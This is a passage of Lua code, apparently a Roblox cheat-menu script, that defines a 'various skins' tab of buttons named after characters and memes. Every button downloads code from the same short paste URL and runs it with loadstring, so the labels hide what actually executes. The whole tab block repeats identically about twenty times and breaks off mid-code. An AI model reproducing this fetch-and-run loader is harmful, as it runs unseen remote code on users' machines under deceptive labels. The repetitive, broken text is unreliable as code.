    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
